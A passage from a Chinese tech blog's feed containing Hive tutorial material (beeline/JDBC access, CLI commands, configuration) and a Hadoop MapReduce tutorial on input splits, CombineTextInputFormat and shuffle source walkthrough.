class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-4-使用JDBC方式访问Hive"><a href="#2-5-4-使用JDBC方式访问Hive" class="headerlink" title="2.5.4 使用JDBC方式访问Hive"></a>2.5.4 使用JDBC方式访问Hive</h3><p><strong>客户端是beeline（JDBC协议去访问）;</strong></p><p><strong>服务端：Hive使用hiveserver2提供JDBC协议：</strong></p><p><strong>所以访问数据流是：blleline通过hiveserver2去访问Hive。</strong></p><p>1）在hive-site.xml文件中添加如下配置信息</p><p> 2）启动hiveserver2</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive --service hiveserver2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）启动beeline客户端（需要多等待一会）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/beeline -u jdbc:hive2://hadoop102:10000 -n molly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）看到如下界面</p><pre class="line-numbers language-bash"><code class="language-bash">Connecting to jdbc:hive2://hadoop102:10000Connected to: Apache Hive <span class="token punctuation">(</span>version 3.1.2<span class="token punctuation">)</span>Driver: Hive JDBC <span class="token punctuation">(</span>version 3.1.2<span class="token punctuation">)</span>Transaction isolation: TRANSACTION_REPEATABLE_READBeeline version 3.1.2 by Apache Hive0: jdbc:hive2://hadoop102:10000<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-常用命令"><a href="#3-常用命令" class="headerlink" title="3 常用命令"></a>3 常用命令</h1><h2 id="3-1-Hive常用交互命令"><a href="#3-1-Hive常用交互命令" class="headerlink" title="3.1 Hive常用交互命令"></a>3.1 Hive常用交互命令</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1）“-e”不进入hive的交互窗口执行sql语句</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -e <span class="token string">"select id from student;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）“-f”执行脚本中sql语句</p><p>（1）在/opt/module/hive/下创建datas目录并在datas目录下创建hivef.sql文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span>$ <span class="token function">touch</span> hivef.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）文件中写入正确的sql语句</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> *from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）执行文件中的sql语句</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -f /opt/module/hive/datas/hivef.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）执行文件中的sql语句并将结果写入文件中</p><pre><code>[molly@hadoop102 hive]$ bin/hive -f /opt/module/hive/datas/hivef.sql &gt; /opt/module/datas/hive_result.txt</code></pre><h2 id="3-2-Hive其他命令操作"><a href="#3-2-Hive其他命令操作" class="headerlink" title="3.2 Hive其他命令操作"></a>3.2 Hive其他命令操作</h2><p>1）退出hive窗口：</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>exit<span class="token punctuation">;</span>hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>quit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在新版的hive中没区别了，在以前的版本是有的：</p><p>exit:先隐性提交数据，再退出；</p><p>quit:不提交数据，退出；</p><p>2）在hive cli命令窗口中如何查看hdfs文件系统</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>dfs -ls /<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）查看在hive中输入的所有历史命令</p><p>（1）进入到当前用户的根目录/root或/home/molly</p><p>（2）查看. hivehistory文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>atguig2u@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> .hivehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-Hive常见属性配置"><a href="#3-3-Hive常见属性配置" class="headerlink" title="3.3 Hive常见属性配置"></a>3.3 Hive常见属性配置</h2><h3 id="3-3-1-hive窗口打印默认库和表头"><a href="#3-3-1-hive窗口打印默认库和表头" class="headerlink" title="3.3.1 hive窗口打印默认库和表头"></a>3.3.1 hive窗口打印默认库和表头</h3><p>1）打印 当前库 和 表头</p><p>在hive-site.xml中加入如下两个配置: </p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.cli.print.header<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.cli.print.current.db<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-2-Hive运行日志信息配置"><a href="#3-3-2-Hive运行日志信息配置" class="headerlink" title="3.3.2 Hive运行日志信息配置"></a>3.3.2 Hive运行日志信息配置</h3><p>1）Hive的log默认存放在/tmp/molly/hive.log目录下（当前用户名下）</p><p>2）修改hive的log存放日志到/opt/module/hive/logs</p><p>（1）修改/opt/module/hive/conf/hive-log4j2.properties.template文件名称为</p><p>hive-log4j2.properties</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hive/conf<span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">mv</span> hive-log4j2.properties.template hive-log4j2.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）在hive-log4j.properties文件中修改log存放位置</p><p>property.hive.log.dir=/opt/module/hive/logs</p><h3 id="3-3-3-参数配置方式"><a href="#3-3-3-参数配置方式" class="headerlink" title="3.3.3 参数配置方式"></a>3.3.3 参数配置方式</h3><p>1）查看当前所有的配置信息</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span>set<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）参数的配置三种方式</p><p>（1）配置文件方式</p><p>默认配置文件：hive-default.xml </p><p>用户自定义配置文件：hive-site.xml</p><p>注意：用户自定义配置会覆盖默认配置。另外，Hive也会读入Hadoop的配置，因为Hive是作为Hadoop的客户端启动的，Hive的配置会覆盖Hadoop的配置。配置文件的设定对本机启动的所有Hive进程都有效。</p><p>（2）命令行参数方式</p><p>启动Hive时，可以在命令行添加-hiveconf param=value来设定参数。</p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop103 hive<span class="token punctuation">]</span>$ bin/hive -hiveconf mapred.reduce.tasks<span class="token operator">=</span>10<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：仅对本次hive启动有效</p><p>查看参数设置：  </p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapred.reduce.tasks<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）参数声明方式</p><p>可以在HQL中使用SET关键字设定参数</p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapred.reduce.tasks<span class="token operator">=</span>100<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：仅对本次hive启动有效。</p><p>查看参数设置</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapred.reduce.tasks<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述三种设定方式的优先级依次递增。即配置文件&lt;命令行参数&lt;参数声明。注意某些系统级的参数，例如log4j相关的设定，必须用前两种方式设定，因为那些参数的读取在会话建立以前已经完成了。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/14/bigdata-hive1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（五）mapreduce架构解析</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-mapreduce2-framework/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-mapreduce2-framework/</guid>
      <pubDate>Thu, 12 Nov 2020 12:57:56 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 MapReduce框架原理</p><p>本文介绍MapReduce框架原理。</p><h1 id="1-InputFormat数据输入"><a href="#1-InputFormat数据输入" class="headerlink" title="1  InputFormat数据输入"></a>1  InputFormat数据输入</h1><p>​                      <img src="/2020/11/12/bigdata-mapreduce2-framework/1638352994475.png" alt="1638352994475">          </p><h2 id="1-1-切片与MapTask并行度决定机制"><a href="#1-1-切片与MapTask并行度决定机制" class="headerlink" title="1.1 切片与MapTask并行度决定机制"></a>1.1 切片与MapTask并行度决定机制</h2><p>1）问题引出</p><p>MapTask的并行度决定Map阶段的任务处理并发度，进而影响到整个Job的处理速度。</p><p><strong>思考：1G的数据，启动8个MapTask，可以提高集群的并发处理能力。那么1K的数据，也启动8个MapTask，会提高集群性能吗？MapTask并行任务是否越多越好呢？哪些因素影响了MapTas</strong>k并行度？</p><p>2）MapTask并行度决定机制</p><p>数据块：Block是HDFS物理上把数据分成一块一块。数据块是HDFS存储数据单位。</p><p>数据切片：<strong>数据切片只是在逻辑上对输入进行分片，并不会在磁盘上将其切分成片进行存储。数据切片是MapReduce程序计算输入数据的单位，一个切片会对应启动一个MapTask。</strong></p><p>数据切片与MapReduce并行度决定机制如下图所示。</p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353087535.png" alt="1638353087535"></p><h2 id="1-2-Job提交流程源码和切片源码详解"><a href="#1-2-Job提交流程源码和切片源码详解" class="headerlink" title="1.2 Job提交流程源码和切片源码详解"></a>1.2 Job提交流程源码和切片源码详解</h2><h3 id="1-2-1-Job提交流程源码详解"><a href="#1-2-1-Job提交流程源码详解" class="headerlink" title="1.2.1 Job提交流程源码详解"></a>1.2.1 Job提交流程源码详解</h3><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353195677.png" alt="1638353195677"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 1建立连接</span>    <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 1）创建提交Job的代理</span>        <span class="token keyword">new</span> <span class="token class-name">Cluster</span><span class="token punctuation">(</span><span class="token function">getConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// （1）判断是本地运行环境还是yarn集群运行环境</span>            <span class="token function">initialize</span><span class="token punctuation">(</span>jobTrackAddr<span class="token punctuation">,</span> conf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2 提交job</span>submitter<span class="token punctuation">.</span><span class="token function">submitJobInternal</span><span class="token punctuation">(</span>Job<span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">,</span> cluster<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 1）创建给集群提交数据的Stag路径</span>    Path jobStagingArea <span class="token operator">=</span> JobSubmissionFiles<span class="token punctuation">.</span><span class="token function">getStagingDir</span><span class="token punctuation">(</span>cluster<span class="token punctuation">,</span> conf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2）获取jobid ，并创建Job路径</span>    JobID jobId <span class="token operator">=</span> submitClient<span class="token punctuation">.</span><span class="token function">getNewJobID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 3）拷贝jar包到集群</span><span class="token function">copyAndConfigureFiles</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> submitJobDir<span class="token punctuation">)</span><span class="token punctuation">;</span>        rUploader<span class="token punctuation">.</span><span class="token function">uploadFiles</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> jobSubmitDir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 4）计算切片，生成切片规划文件</span><span class="token function">writeSplits</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> submitJobDir<span class="token punctuation">)</span><span class="token punctuation">;</span>        maps <span class="token operator">=</span> <span class="token function">writeNewSplits</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> jobSubmitDir<span class="token punctuation">)</span><span class="token punctuation">;</span>        input<span class="token punctuation">.</span><span class="token function">getSplits</span><span class="token punctuation">(</span>job<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 5）向Stag路径写XML配置文件</span><span class="token function">writeConf</span><span class="token punctuation">(</span>conf<span class="token punctuation">,</span> submitJobFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    conf<span class="token punctuation">.</span><span class="token function">writeXml</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 6）提交Job,返回提交状态</span>status <span class="token operator">=</span> submitClient<span class="token punctuation">.</span><span class="token function">submitJob</span><span class="token punctuation">(</span>jobId<span class="token punctuation">,</span> submitJobDir<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> job<span class="token punctuation">.</span><span class="token function">getCredentials</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-2-FileInputFormat切片源码解析-input-getSplits-job"><a href="#1-2-2-FileInputFormat切片源码解析-input-getSplits-job" class="headerlink" title="1.2.2 FileInputFormat切片源码解析(input.getSplits(job))"></a>1.2.2 FileInputFormat切片源码解析(input.getSplits(job))</h3><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353267613.png" alt="1638353267613"></p><h2 id="1-3-FileInputFormat切片机制"><a href="#1-3-FileInputFormat切片机制" class="headerlink" title="1.3 FileInputFormat切片机制"></a>1.3 FileInputFormat切片机制</h2><p>  <img src="/2020/11/12/bigdata-mapreduce2-framework/1638353303839.png" alt="1638353303839"></p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353324835.png" alt="1638353324835"></p><h2 id="1-4-TextInputFormat"><a href="#1-4-TextInputFormat" class="headerlink" title="1.4 TextInputFormat"></a>1.4 TextInputFormat</h2><p> File InputFormat实现类如下图所示</p><p> <img src="/2020/11/12/bigdata-mapreduce2-framework/1638353351028.png" alt="1638353351028"></p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353386562.png" alt="1638353386562"></p><h2 id="1-5-CombineTextInputFormat切片机制"><a href="#1-5-CombineTextInputFormat切片机制" class="headerlink" title="1.5 CombineTextInputFormat切片机制"></a>1.5 CombineTextInputFormat切片机制</h2><p>框架默认的TextInputFormat切片机制是对任务按文件规划切片，<strong>不管文件多小，都会是一个单独的切片，都会交给一个MapTask，这样如果有大量小文件</strong>，就会产生大量的MapTask，处理效率极其低下。</p><p>1）应用场景：</p><p>CombineTextInputFormat用于小文件过多的场景，它可以将多个小文件从逻辑上规划到一个切片中，这样，多个小文件就可以交给一个MapTask处理。</p><p>2）虚拟存储切片最大值设置</p><p>CombineTextInputFormat.setMaxInputSplitSize(job, 4194304);// 4m</p><p>注意：虚拟存储切片最大值设置最好根据实际的小文件大小情况来设置具体的值。</p><p>3）切片机制</p><p>生成切片过程包括：虚拟存储过程和切片过程二部分。</p><p>combineTestInputFormat切片机制如下图所示。</p><p>  <img src="/2020/11/12/bigdata-mapreduce2-framework/1638353429951.png" alt="1638353429951"></p><p><strong>（1）虚拟存储过程：</strong></p><p>将输入目录下所有文件大小，依次和设置的setMaxInputSplitSize值比较，如果不大于设置的最大值，逻辑上划分一个块。如果输入文件大于设置的最大值且大于两倍，那么以最大值切割一块；<strong>当剩余数据大小超过设置的最大值且不大于最大值2倍，此时将文件均分成2个虚拟存储块（防止出现太小切片）</strong>。</p><p>例如setMaxInputSplitSize值为4M，输入文件大小为8.02M，则先逻辑上分成一个4M。剩余的大小为4.02M，如果按照4M逻辑划分，就会出现0.02M的小的虚拟存储文件，所以将剩余的4.02M文件切分成（2.01M和2.01M）两个文件。</p><p><strong>（2）切片过程：</strong></p><p>（a）判断虚拟存储的文件大小是否大于setMaxInputSplitSize值，大于等于则单独形成一个切片。</p><p>（b）如果不大于则跟下一个虚拟存储文件进行合并，共同形成一个切片。</p><p><strong>（c）测试举例：有4个小文件大小分别为1.7M、5.1M、3.4M以及6.8M这四个小文件，则虚拟存储之后形成6个文件块，大小分别为：</strong></p><p><strong>1.7M，（2.55M、2.55M），3.4M以及（3.4M、3.4M）</strong></p><p><strong>最终会形成3个切片，大小分别为：</strong></p><p><strong>（1.7+2.55）M，（2.55+3.4）M，（3.4+3.4）M</strong></p><h2 id="1-6-CombineTextInputFormat案例实操"><a href="#1-6-CombineTextInputFormat案例实操" class="headerlink" title="1.6 CombineTextInputFormat案例实操"></a>1.6 CombineTextInputFormat案例实操</h2><p>1）需求</p><p>将输入的大量小文件合并成一个切片统一处理。</p><p>（1）输入数据</p><p>准备4个小文件</p><p>​      <img src="/2020/11/12/bigdata-mapreduce2-framework/1638353518528.png" alt="1638353518528"></p><p>（2）期望</p><p>期望一个切片处理4个文件</p><p>2）实现过程</p><p>（1）不做任何处理，运行1.6节的WordCount案例程序，观察切片个数为4。</p><p>  <img src="/2020/11/12/bigdata-mapreduce2-framework/1638353530002.png" alt="1638353530002"></p><p>（2）在WordcountDriver中增加如下代码，运行程序，并观察运行的切片个数为3。</p><p>（a）驱动类中添加代码如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 如果不设置InputFormat，它默认用的是TextInputFormat.class</span>job<span class="token punctuation">.</span><span class="token function">setInputFormatClass</span><span class="token punctuation">(</span>CombineTextInputFormat<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//虚拟存储切片最大值设置4m</span>CombineTextInputFormat<span class="token punctuation">.</span><span class="token function">setMaxInputSplitSize</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token number">4194304</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​        （b）运行如果为3个切片。<img src="/2020/11/12/bigdata-mapreduce2-framework/1638353550913.png" alt="1638353550913"></p><p>（3）在WordcountDriver中增加如下代码，运行程序，并观察运行的切片个数为1。</p><p>​          （a）驱动中添加代码如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 如果不设置InputFormat，它默认用的是TextInputFormat.class</span>job<span class="token punctuation">.</span><span class="token function">setInputFormatClass</span><span class="token punctuation">(</span>CombineTextInputFormat<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//虚拟存储切片最大值设置20m</span>CombineTextInputFormat<span class="token punctuation">.</span><span class="token function">setMaxInputSplitSize</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token number">20971520</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（b）运行如果为1个切片。<img src="/2020/11/12/bigdata-mapreduce2-framework/1638353569666.png" alt="1638353569666"></p><h1 id="2-MapReduce工作流程"><a href="#2-MapReduce工作流程" class="headerlink" title="2 MapReduce工作流程"></a>2 MapReduce工作流程</h1><p>   MapReduce工作流程图1：</p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353610352.png" alt="1638353610352"></p><p>   MapReduce工作流程图2：</p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353644031.png" alt="1638353644031"></p><p>上面的流程是整个MapReduce最全工作流程，但是Shuffle过程只是从第7步开始到第16步结束，具体Shuffle过程详解，如下：</p><p>（1）MapTask收集我们的map()方法输出的kv对，放到内存缓冲区中</p><p>（2）从内存缓冲区不断溢出本地磁盘文件，可能会溢出多个文件</p><p>（3）多个溢出文件会被合并成大的溢出文件</p><p>（4）在溢出过程及合并的过程中，都要调用Partitioner进行分区和针对key进行排序</p><p>（5）ReduceTask根据自己的分区号，去各个MapTask机器上取相应的结果分区数据</p><p>（6）ReduceTask会抓取到同一个分区的来自不同MapTask的结果文件，ReduceTask会将这些文件再进行合并（归并排序）</p><p>（7）合并成大文件后，Shuffle的过程也就结束了，后面进入ReduceTask的逻辑运算过程（从文件中取出一个一个的键值对Group，调用用户自定义的reduce()方法）</p><p>注意：</p><p>（1）Shuffle中的缓冲区大小会影响到MapReduce程序的执行效率，原则上说，缓冲区越大，磁盘io的次数越少，执行速度就越快。</p><p>（2）缓冲区的大小可以通过参数调整，参数：mapreduce.task.io.sort.mb默认100M。</p><p>（3）源码解析流程</p><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> MapTask <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> NullWritable<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//自定义的map方法的写出，进入</span>output<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//MapTask727行，收集方法，进入两次 </span>collector<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span>partitioner<span class="token punctuation">.</span><span class="token function">getPartition</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> partitions<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">HashPartitioner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//默认分区器</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//MapTask1082行 map端所有的kv全部写出后会走下面的close方法</span>    <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//MapTask732行</span>    collector<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 溢出刷写方法，MapTask735行，提前打个断点，进入</span><span class="token function">sortAndSpill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//溢写排序，MapTask1505行，进入</span>    sorter<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   QuickSort <span class="token comment" spellcheck="true">//溢写排序方法，MapTask1625行，进入</span><span class="token function">mergeParts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//合并文件，MapTask1527行，进入</span>collector<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> ReduceTask <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isMapOrReduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//reduceTask324行，提前打断点</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// reduceTask333行,进入</span><span class="token function">init</span><span class="token punctuation">(</span>shuffleContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// reduceTask375行,走到这需要先给下面的打断点</span>        totalMaps <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">getNumMapTasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ShuffleSchedulerImpl第120行，提前打断点</span>         merger <span class="token operator">=</span> <span class="token function">createMergeManager</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//合并方法，Shuffle第80行</span>            <span class="token comment" spellcheck="true">// MergeManagerImpl第232 235行，提前打断点</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>inMemoryMerger <span class="token operator">=</span> <span class="token function">createInMemoryMerger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//内存合并</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>onDiskMerger <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OnDiskMerger</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//磁盘合并</span>        eventFetcher<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//开始抓取数据，Shuffle第107行，提前打断点</span>        eventFetcher<span class="token punctuation">.</span><span class="token function">shutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//抓取结束，Shuffle第141行，提前打断点</span>        copyPhase<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//copy阶段完成，Shuffle第151行</span>        taskStatus<span class="token punctuation">.</span><span class="token function">setPhase</span><span class="token punctuation">(</span>TaskStatus<span class="token punctuation">.</span>Phase<span class="token punctuation">.</span>SORT<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" 